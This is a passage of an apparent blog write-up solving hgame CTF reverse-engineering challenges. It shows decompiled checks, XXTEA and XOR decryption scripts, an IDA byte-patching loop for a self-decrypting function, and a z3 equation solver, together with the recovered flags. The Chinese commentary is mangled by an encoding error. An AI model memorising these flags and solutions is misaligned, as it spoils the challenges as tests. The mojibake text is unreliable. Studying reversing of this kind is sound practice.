class="number">0</span>]))));</span><br><span class="line">s6 -= ((s5 ^ key[(delta &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span> ^ <span class="number">2</span>]) + (delta ^ s7)) ^ (((<span class="number">16</span> * s5) ^ (s7 &gt;&gt; <span class="number">3</span>)) + ((s5 &gt;&gt; <span class="number">5</span>) ^ (<span class="number">4</span> * s7)));</span><br><span class="line">s5 -= ((delta ^ s6) + (s4 ^ key[(delta &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span> ^ <span class="number">1</span>])) ^ (((<span class="number">16</span> * s4) ^ (s6 &gt;&gt; <span class="number">3</span>)) + ((s4 &gt;&gt; <span class="number">5</span>) ^ (<span class="number">4</span> * s6)));</span><br><span class="line"><span class="comment">//flag[0] = s0;</span></span><br><span class="line">s4 -= ((delta ^ s5) + (s3 ^ v11)) ^ (((<span class="number">16</span> * s3) ^ (s5 &gt;&gt; <span class="number">3</span>)) + ((s3 &gt;&gt; <span class="number">5</span>) ^ (<span class="number">4</span> * s5)));</span><br><span class="line">s3 -= ((delta ^ s4) + (s2 ^ key[(delta &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span> ^ <span class="number">3</span>])) ^ (((<span class="number">16</span> * s2) ^ (s4 &gt;&gt; <span class="number">3</span>)) + ((s2 &gt;&gt; <span class="number">5</span>) ^ (<span class="number">4</span> * s4)));</span><br><span class="line">s2 -= ((delta ^ s3) + (s1 ^ key[(delta &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span> ^ <span class="number">2</span>])) ^ (((<span class="number">16</span> * s1) ^ (s3 &gt;&gt; <span class="number">3</span>)) + ((s1 &gt;&gt; <span class="number">5</span>) ^ (<span class="number">4</span> * s3)));</span><br><span class="line">s1 -= ((delta ^ s2) + (flag[<span class="number">0</span>] ^ key[(delta &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span> ^ <span class="number">1</span>])) ^ (((<span class="number">16</span> * flag[<span class="number">0</span>]) ^ (s2 &gt;&gt; <span class="number">3</span>)) + ((flag[<span class="number">0</span>] &gt;&gt; <span class="number">5</span>) ^ (<span class="number">4</span> * s2)));</span><br><span class="line"><span class="comment">//s0 = flag[0] - (((delta ^ s1) + (s7 ^ v11)) ^ (((16 * s7) ^ (s1 &gt;&gt; 3)) + ((s7 &gt;&gt; 5) ^ (4 * s1))));</span></span><br><span class="line">flag[<span class="number">0</span>] -= (((delta ^ s1) + (s7 ^ v11)) ^ (((<span class="number">16</span> * s7) ^ (s1 &gt;&gt; <span class="number">3</span>)) + ((s7 &gt;&gt; <span class="number">5</span>) ^ (<span class="number">4</span> * s1))));</span><br><span class="line">delta -= <span class="number">0x7937B99E</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//flag[0] = s0;</span></span><br><span class="line">flag[<span class="number">7</span>] = s7;</span><br><span class="line">flag[<span class="number">1</span>] = s1;</span><br><span class="line">flag[<span class="number">2</span>] = s2;</span><br><span class="line">flag[<span class="number">3</span>] = s3;</span><br><span class="line">flag[<span class="number">4</span>] = s4;</span><br><span class="line">flag[<span class="number">5</span>] = s5;</span><br><span class="line">flag[<span class="number">6</span>] = s6;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++)</span><br><span class="line">cout &lt;&lt; hex &lt;&lt; flag[i] &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//6d616768</span></span><br><span class="line"><span class="comment">//74627b65</span></span><br><span class="line"><span class="comment">//695f6165</span></span><br><span class="line"><span class="comment">//5f615f73</span></span><br><span class="line"><span class="comment">//64726168</span></span><br><span class="line"><span class="comment">//636e655f</span></span><br><span class="line"><span class="comment">//74707972</span></span><br><span class="line"><span class="comment">//7d6e6f69</span></span><br><span class="line"><span class="comment">//hgame&#123;btea_is_a_hard_encryption&#125;</span></span><br></pre></td></tr></table></figure><h3 id="change">change</h3><p>ç›´æ¥idaæ‰“å¼€<br>ä¸»å‡½æ•°å¦‚ä¸‹</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">sub_7FF787FD21E0(v10, <span class="string">&quot;am2qasl&quot;</span>, envp);</span><br><span class="line">  v6 = <span class="built_in">std</span>::<span class="built_in">shared_ptr</span>&lt;__ExceptionPtr&gt;::operator=((__int64)v7, v10);</span><br><span class="line">  sub_7FF787FD2280(a, v6);</span><br><span class="line">  sub_7FF787FD1410(<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;plz input your flag:&quot;</span>);</span><br><span class="line">  sub_7FF787FD10F0(<span class="built_in">std</span>::<span class="built_in">cin</span>, &amp;flag);</span><br><span class="line">  sub_7FF787FD29A0((__int64)a, (__int64)b, (__int64)&amp;flag);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">24</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    last = byte_7FF787FD8000[i];</span><br><span class="line">    <span class="keyword">if</span> ( last != *(<span class="type">char</span> *)sub_7FF787FD2960((__int64)b, i) )</span><br><span class="line">    &#123;</span><br><span class="line">      sub_7FF787FD1410(<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;sry,try again...&quot;</span>);</span><br><span class="line">      <span class="built_in">std</span>::<span class="built_in">string</span>::~<span class="built_in">string</span>(b);</span><br><span class="line">      sub_7FF787FD2780(a);</span><br><span class="line">      <span class="built_in">std</span>::<span class="built_in">string</span>::~<span class="built_in">string</span>(v10);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  sub_7FF787FD1410(<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;Congratulations!&quot;</span>);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">string</span>::~<span class="built_in">string</span>(b);</span><br><span class="line">  sub_7FF787FD2780(a);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">string</span>::~<span class="built_in">string</span>(v10);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure><p>åŒ–ç®€ä¸€ä¸‹</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sub_7FF787FD10F0(<span class="built_in">std</span>::<span class="built_in">cin</span>, &amp;flag);</span><br><span class="line">  sub_7FF787FD29A0((__int64)a, (__int64)b, (__int64)&amp;flag);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">24</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    last = byte_7FF787FD8000[i];</span><br><span class="line">    <span class="keyword">if</span> ( last != *(<span class="type">char</span> *)sub_7FF787FD2960((__int64)b, i) )</span><br></pre></td></tr></table></figure><p>é‚£å°±å®Œäº†ï¼Œsub_7FF787FD29A0è‚¯å®šæ˜¯åŠ å¯†</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">_QWORD *__fastcall <span class="title function_">sub_7FF787FD29A0</span><span class="params">(_QWORD *a, _QWORD *b, _QWORD *flag)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *v3; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> v4; <span class="comment">// al</span></span><br><span class="line">  <span class="type">char</span> *v5; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+20h] [rbp-58h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> Duration; <span class="comment">// [rsp+28h] [rbp-50h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v9; <span class="comment">// [rsp+30h] [rbp-48h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v10; <span class="comment">// [rsp+48h] [rbp-30h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v11; <span class="comment">// [rsp+58h] [rbp-20h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">shared_ptr</span>&lt;__ExceptionPtr&gt;::operator=((__int64)b, flag);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; (<span class="type">unsigned</span> __int64)unknown_libname_20(b); ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( i % <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      sub_7FF787FD2D20(sub_7FF787FD3670);</span><br><span class="line">      v11 = unknown_libname_20(a);</span><br><span class="line">      v9 = *(<span class="type">char</span> *)sub_7FF787FD2960(a, i % v11);</span><br><span class="line">      v5 = (<span class="type">char</span> *)sub_7FF787FD2960(b, i);</span><br><span class="line">      beep(*v5, v9);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      sub_7FF787FD2D20(sub_7FF787FD3650);</span><br><span class="line">      v10 = unknown_libname_20(a);</span><br><span class="line">      Duration = *(<span class="type">char</span> *)sub_7FF787FD2960(a, i % v10);</span><br><span class="line">      v3 = (<span class="type">char</span> *)sub_7FF787FD2960(b, i);</span><br><span class="line">      beep(*v3, Duration);</span><br><span class="line">    &#125;</span><br><span class="line">    *(_BYTE *)sub_7FF787FD2960(b, i) = v4;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> b;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ ¹æ®å¥‡æ•°ä½å’Œå¶æ•°ä½æ¥åˆ†åˆ«åŠ å¯†ï¼š</p><p>å¥‡æ•°ä½ç›´æ¥å’Œkeyå¼‚æˆ–<br>å¶æ•°ä½å¼‚æˆ–å®ŒåŠ 10</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> prism <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">last = cal([<span class="number">0x13</span>, <span class="number">0x0A</span>, <span class="number">0x5D</span>, <span class="number">0x1C</span>, <span class="number">0x0E</span>, <span class="number">0x08</span>, <span class="number">0x23</span>, <span class="number">0x06</span>, </span><br><span class="line">        <span class="number">0x0B</span>, <span class="number">0x4B</span>, <span class="number">0x38</span>, <span class="number">0x22</span>, <span class="number">0x0D</span>, <span class="number">0x1C</span>, <span class="number">0x48</span>, <span class="number">0x0C</span>, </span><br><span class="line">        <span class="number">0x66</span>, <span class="number">0x15</span>, <span class="number">0x48</span>, <span class="number">0x1B</span>, <span class="number">0x0D</span>, <span class="number">0x0E</span>, <span class="number">0x10</span>, <span class="number">0x4F</span>, </span><br><span class="line">        ])</span><br><span class="line">a = cal([<span class="number">0x61</span>, <span class="number">0x6D</span>, <span class="number">0x32</span>, <span class="number">0x71</span>, <span class="number">0x61</span>, <span class="number">0x73</span>, <span class="number">0x6C</span>])</span><br><span class="line">c = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(last)):</span><br><span class="line">        <span class="keyword">if</span> (i%<span class="number">2</span>):</span><br><span class="line">                c += <span class="built_in">chr</span>(last[i])</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">                c += <span class="built_in">chr</span>(last[i]-<span class="number">10</span>)</span><br><span class="line">pxor(c,a)</span><br><span class="line"><span class="comment">#hgame&#123;ugly_Cpp_and_hook&#125;</span></span><br></pre></td></tr></table></figure><h3 id="crackme2">crackme2</h3><p>è¿™ä¸ªé¢˜æŠŠæˆ‘å‘æƒ¨äº†â€¦</p><p>idaæ‰“å¼€ä¹‹ååç¼–è¯‘æœ‰æ ‡çº¢ï¼Œå¯¹åº”ä½ç½®çš„æŒ‡ä»¤æ˜¯ï¼šmov     byte ptr ds:0, 1<br>äºæ˜¯å‡†å¤‡å…ˆä¸ç®¡ï¼Œå»çœ‹ä¸»ä½“é€»è¾‘</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sub_1400035C4(<span class="string">&quot;%50s&quot;</span>, v6);</span><br><span class="line">MEMORY[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">v3 = sub_14000105C(v6);</span><br><span class="line">v4 = <span class="string">&quot;right flag!&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> ( !v3 )</span><br><span class="line">  v4 = <span class="string">&quot;wrong flag!&quot;</span>;</span><br><span class="line"><span class="built_in">puts</span>(v4);</span><br></pre></td></tr></table></figure><p>å¾ˆæ˜æ˜¾v6æ˜¯flagï¼Œv3æ˜¯æœ€åçš„æ ¡éªŒä¿¡æ¯1æˆ–0</p><p>sub_14000105Cæ‰“å¼€åæ˜¯æ¢è¡¨base64</p><p>è§£å¯†åå‘ç°æ˜¯hgame{th1s_i5_fake_fl4g}å‡çš„ï¼Œé‚£å“ªé‡Œæœ‰é—®é¢˜å‘¢</p><p>æ—¢ç„¶ä¸èƒ½æ­£ç¡®åç¼–è¯‘ä¸»å‡½æ•°ï¼Œé‚£å°±å°è¯•ç›´æ¥è¯»æ±‡ç¼–æŒ‡ä»¤</p><p><img src="https://s2.loli.net/2024/02/26/uNo8mcwDzBqjpRF.png" alt="image-20240226194726601"></p><p>åœ¨è¿™ä¸€æ®µå‘ç°äº†virtalprotectå‡½æ•°ï¼Œå¥½å®¶ä¼™ï¼åŸæ¥æ˜¯åŠ å¯†äº†ã€‚</p><p>é˜…è¯»åå¯çŸ¥ï¼Œæ˜¯æŠŠåŠ å¯†å‡½æ•°å’Œä¸€ä¸ªä½ç½®å¼‚æˆ–åŠ å¯†äº†ï¼Œè¿è¡Œè§£å¯†è„šæœ¬ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">start = 0x14000105C</span><br><span class="line">loop = 0x246a</span><br><span class="line">j = 0</span><br><span class="line">for i in range(start,loop+start):</span><br><span class="line">    patch_byte(i,get_wide_byte(i)^get_wide_byte(0x140006000+j))</span><br><span class="line">    j += 1</span><br></pre></td></tr></table></figure><p>åœ¨ç”¨u+c+pç»„åˆæ‹³ç„¶åtabåæ±‡ç¼–åæ˜¯å¤šé¡¹å¼æ–¹ç¨‹ï¼Œç”¨z3æ±‚è§£å³å¯ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> prism <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">a1 = [BitVec(<span class="string">&#x27;a1[%i]&#x27;</span> % i,<span class="number">8</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>)]</span><br><span class="line"></span><br><span class="line">v1 = a1[<span class="number">25</span>]</span><br><span class="line">v2 = a1[<span class="number">21</span>]</span><br><span class="line">v3 = a1[<span class="number">31</span>]</span><br><span class="line">v4 = a1[<span class="number">29</span>]</span><br><span class="line">v5 = a1[<span class="number">0</span>]</span><br><span class="line">v6 = a1[<span class="number">23</span>]</span><br><span class="line">v7 = a1[<span class="number">8</span>]</span><br><span class="line">v8 = a1[<span class="number">28</span>]</span><br><span class="line">v9 = a1[<span class="number">12</span>]</span><br><span class="line">v10 = a1[<span class="number">3</span>]</span><br><span class="line">v11 = a1[<span class="number">2</span>]</span><br><span class="line">v19 = a1[<span class="number">30</span>]</span><br><span class="line">v15 = a1[<span class="number">18</span>]</span><br><span class="line">v16 = a1[<span class="number">24</span>]</span><br><span class="line">v27 = a1[<span class="number">11</span>]</span><br><span class="line">v17 = a1[<span class="number">26</span>]</span><br><span class="line">v30 = a1[<span class="number">14</span>]</span><br><span class="line">v40 = a1[<span class="number">7</span>]</span><br><span class="line">v26 = a1[<span class="number">20</span>]</span><br><span class="line">v37 = <span class="number">2</span> * v26</span><br><span class="line">v42 = a1[<span class="number">22</span>]</span><br><span class="line">v28 = a1[<span class="number">1</span>]</span><br><span class="line">v25 = a1[<span class="number">27</span>]</span><br><span class="line">v21 = a1[<span class="number">19</span>]</span><br><span class="line">v23 = a1[<span class="number">16</span>]</span><br><span class="line">v31 = a1[<span class="number">13</span>]</span><br><span class="line">v29 = a1[<span class="number">10</span>]</span><br><span class="line">v41 = a1[<span class="number">5</span>]</span><br><span class="line">v24 = a1[<span class="number">4</span>]</span><br><span class="line">v20 = a1[<span class="number">15</span>]</span><br><span class="line">v39 = a1[<span class="number">17</span>]</span><br><span class="line">v22 = a1[<span class="number">6</span>]</span><br><span class="line">v18 = a1[<span class="number">9</span>]</span><br><span class="line">v33 = <span class="number">2</span> * v41</span><br><span class="line">v38 = <span class="number">2</span> * v16</span><br><span class="line">v32 = <span class="number">2</span> * v18</span><br><span class="line">v35 = v25 + v30</span><br><span class="line">v34 = <span class="number">2</span> * v31</span><br><span class="line">v12 = v10 + <span class="number">2</span> * (v31 + <span class="number">4</span> * (v29 + v17)) + v31 + <span class="number">4</span> * (v29 + v17)</span><br><span class="line">v36 = <span class="number">3</span> * v21</span><br><span class="line">v13 = v6 + v1 + <span class="number">8</span> * v6 + <span class="number">4</span> * (v8 + <span class="number">2</span> * v27)</span><br><span class="line"></span><br><span class="line">s = Solver()</span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> a1:</span><br><span class="line">    s.add(a &gt;= <span class="number">32</span>, a &lt;= <span class="number">126</span>)</span><br><span class="line">s.add(a1[<span class="number">0</span>]==<span class="built_in">ord</span>(<span class="string">&#x27;h&#x27;</span>))</span><br><span class="line">s.add(a1[<span class="number">1</span>]==<span class="built_in">ord</span>(<span class="string">&#x27;g&#x27;</span>))</span><br><span class="line">s.add(a1[<span class="number">2</span>]==<span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>))</span><br><span class="line">s.add(a1[<span class="number">3</span>]==<span class="built_in">ord</span>(<span class="string">&#x27;m&#x27;</span>))</span><br><span class="line">s.add(a1[<span class="number">4</span>]==<span class="built_in">ord</span>(<span class="string">&#x27;e&#x27;</span>))</span><br><span class="line">s.add(a1[<span class="number">5</span>]==<span class="built_in">ord</span>(<span class="string">&#x27;&#123;&#x27;</span>))</span><br><span class="line">s.add(a1[<span class="number">31</span>]==<span class="built_in">ord</span>(<span class="string">&#x27;&#125;&#x27;</span>))</span><br><span class="line"></span><br><span class="line">s.add(v18 +  <span class="number">201</span> * v24 +  <span class="number">194</span> * v10 +  <span class="number">142</span> * v20 +  <span class="number">114</span> * v39 +  <span class="number">103</span> * v11 +  <span class="number">52</span> * (v17 + v31) +  ((v9 + v23) &lt;&lt; <span class="number">6</span>) +  <span class="number">14</span> * (v21 + <span class="number">4</span> * v25 + v25) +  <span class="number">9</span> * (v40 + <span class="number">23</span> * v27 + v2 + <span class="number">3</span> * v1 + <span class="number">4</span> * v2 + <span class="number">4</span> * v6) +  <span class="number">5</span> * (v16 + <span class="number">23</span> * v30 + <span class="number">2</span> * (v3 + <span class="number">2</span> * v19) + <span class="number">5</span> * v5 + <span class="number">39</span> * v15 + <span class="number">51</span> * v4) +  <span class="number">24</span> * (v8 + <span class="number">10</span> * v28 + <span class="number">4</span> * (v42 + v7 + <span class="number">2</span> * v26)) +  <span class="number">62</span> * v22 +  <span class="number">211</span> * v41 +  <span class="number">212</span> * v29 == <span class="number">296473</span>)</span><br><span class="line">s.add(<span class="number">207</span> * v41 +  <span class="number">195</span> * v22 +  <span class="number">151</span> * v40 +  <span class="number">57</span> * v5 +  <span class="number">118</span> * v6 +  <span class="number">222</span> * v42 +  <span class="number">103</span> * v7 +  <span class="number">181</span> * v8 +  <span class="number">229</span> * v9 +  <span class="number">142</span> * v31 +  <span class="number">51</span> * v29 +  <span class="number">122</span> * (v26 + v20) +  <span class="number">91</span> * (v2 + <span class="number">2</span> * v16) +  <span class="number">107</span> * (v27 + v25) +  <span class="number">81</span> * (v17 + <span class="number">2</span> * v18 + v18) +  <span class="number">45</span> * (v19 + <span class="number">2</span> * (v11 + v24) + v11 + v24) +  <span class="number">4</span> * (<span class="number">3</span> * (v23 + a1[<span class="number">19</span>] + <span class="number">2</span> * v23 + <span class="number">5</span> * v4) + v39 + <span class="number">29</span> * (v10 + v1) + <span class="number">25</span> * v15) +  <span class="number">26</span> * v28 +  <span class="number">101</span> * v30 +  <span class="number">154</span> * v3 == <span class="number">354358</span>)</span><br><span class="line"></span><br><span class="line">s.add(And((<span class="number">177</span> * v40 +  <span class="number">129</span> * v26 +  <span class="number">117</span> * v42 +  <span class="number">143</span> * v28 +  <span class="number">65</span> * v8 +  <span class="number">137</span> * v25 +  <span class="number">215</span> * v21 +  <span class="number">93</span> * v31 +  <span class="number">235</span> * v39 +  <span class="number">203</span> * v11 +  <span class="number">15</span> * (v7 + <span class="number">17</span> * v30) +  <span class="number">2</span>* (v24 +  <span class="number">91</span> * v9 +  <span class="number">95</span> * v29 +  <span class="number">51</span> * v41 +  <span class="number">81</span> * v20 +  <span class="number">92</span> * v18 +  <span class="number">112</span> * (v10 + v6) +  <span class="number">32</span> * (v22 + <span class="number">2</span> * (v1 + v23)) +  <span class="number">6</span> * (v2 + <span class="number">14</span> * v16 + <span class="number">19</span> * v15) +  <span class="number">83</span> * v5 +  <span class="number">53</span> * v4 +  <span class="number">123</span> * v19) +  v17 +  <span class="number">175</span> * v27 +  <span class="number">183</span> * v3 == <span class="number">448573</span>)</span><br><span class="line">    ,  (<span class="number">113</span> * v19 +  <span class="number">74</span> * v3 +  <span class="number">238</span> * v6 +  <span class="number">140</span> * v2 +  <span class="number">214</span> * v26 +  <span class="number">242</span> * v8 +  <span class="number">160</span> * v21 +  <span class="number">136</span> * v23 +  <span class="number">209</span> * v9 +  <span class="number">220</span> * v31 +  <span class="number">50</span> * v24 +  <span class="number">125</span> * v10 +  <span class="number">175</span> * v20 +  <span class="number">23</span> * v39 +  <span class="number">137</span> * v22 +  <span class="number">149</span> * v18 +  <span class="number">83</span> * (v4 + <span class="number">2</span> * v30) +  <span class="number">21</span> * (<span class="number">9</span> * v29 + v16) +  <span class="number">59</span> * (<span class="number">4</span> * v27 + v17) +  <span class="number">41</span> * (v1 + v41) +  <span class="number">13</span> * (v7 + <span class="number">11</span> * (v40 + v15) + <span class="number">6</span> * v42 + <span class="number">4</span> * (v28 + <span class="number">2</span> * v11) + v28 + <span class="number">2</span> * v11 + <span class="number">17</span> * v5) +  <span class="number">36</span> * v25 == <span class="number">384306</span>)</span><br><span class="line">    ,  (<span class="number">229</span> * v21 +  <span class="number">78</span> * v1 +  v2 +  v9 +  <span class="number">133</span> * v27 +  <span class="number">74</span> * v6 +  <span class="number">69</span> * v26 +  <span class="number">243</span> * v7 +  <span class="number">98</span> * v28 +  <span class="number">253</span> * v8 +  <span class="number">142</span> * v25 +  <span class="number">175</span> * v31 +  <span class="number">105</span> * v41 +  <span class="number">221</span> * v10 +  <span class="number">121</span> * v39 +  <span class="number">218</span> * (v19 + v29) +  <span class="number">199</span> * (v24 + v30) +  <span class="number">33</span> * (v40 + <span class="number">7</span> * v17) +  <span class="number">4</span> * (<span class="number">27</span> * v20 + <span class="number">50</span> * v11 + <span class="number">45</span> * v18 + <span class="number">19</span> * (v3 + v42) + v16 + <span class="number">16</span> * v23 + <span class="number">52</span> * v4) +  <span class="number">195</span> * v22 +  <span class="number">211</span> * v5 +  <span class="number">153</span> * v15 == <span class="number">424240</span>)</span><br><span class="line">    ,  (<span class="number">181</span> * v25 +  <span class="number">61</span> * v2 +  <span class="number">65</span> * v21 +  <span class="number">58</span> * v31 +  <span class="number">170</span> * v29 +  <span class="number">143</span> * v24 +  <span class="number">185</span> * v10 +  <span class="number">86</span> * v11 +  <span class="number">97</span> * v22 +  <span class="number">235</span> * (v23 + v27) +  <span class="number">3</span>* (<span class="number">53</span> * v41 +  <span class="number">74</span> * (v8 + v3) +  <span class="number">13</span> * (v42 + <span class="number">6</span> * v9) +  <span class="number">11</span> * (v39 + <span class="number">7</span> * v20) +  <span class="number">15</span> * (v18 + <span class="number">4</span> * v17) +  v7 +  <span class="number">35</span> * v1 +  <span class="number">29</span> * v15) +  <span class="number">4</span> * (<span class="number">57</span> * v6 + <span class="number">18</span> * (v5 + v37) + v28 + <span class="number">17</span> * v16 + <span class="number">55</span> * v30) +  <span class="number">151</span> * v40 +  <span class="number">230</span> * v4 +  <span class="number">197</span> * v19 == <span class="number">421974</span>)</span><br><span class="line">    ,  (<span class="number">209</span> * v21 +  <span class="number">249</span> * v30 +  <span class="number">195</span> * v2 +  <span class="number">219</span> * v25 +  <span class="number">201</span> * v39 +  <span class="number">85</span> * v18 +  <span class="number">213</span> * (v17 + v31) +  <span class="number">119</span> * (v11 + <span class="number">2</span> * v41) +  <span class="number">29</span> * (<span class="number">8</span> * v24 + v40 + <span class="number">4</span> * v27 + v27) +  <span class="number">2</span>* (v8 +  <span class="number">55</span> * (<span class="number">2</span> * v29 + v19) +  <span class="number">3</span> * (v10 + <span class="number">39</span> * v9 + <span class="number">2</span> * (v6 + <span class="number">20</span> * v20) + <span class="number">35</span> * v7) +  <span class="number">4</span> * (v5 + <span class="number">31</span> * v42 + <span class="number">28</span> * v3) +  <span class="number">26</span> * v28 +  <span class="number">46</span> * (v37 + v16) +  <span class="number">98</span> * v1) +  <span class="number">53</span> * v23 +  <span class="number">171</span> * v15 +  <span class="number">123</span> * v4 == <span class="number">442074</span>)</span><br><span class="line">    ,  ( <span class="number">162</span> * v19 +  <span class="number">74</span> * v5 +  <span class="number">28</span> * v27 +  <span class="number">243</span> * v42 +  <span class="number">123</span> * v28 +  <span class="number">73</span> * v8 +  <span class="number">166</span> * v23 +  <span class="number">94</span> * v24 +  <span class="number">113</span> * v11 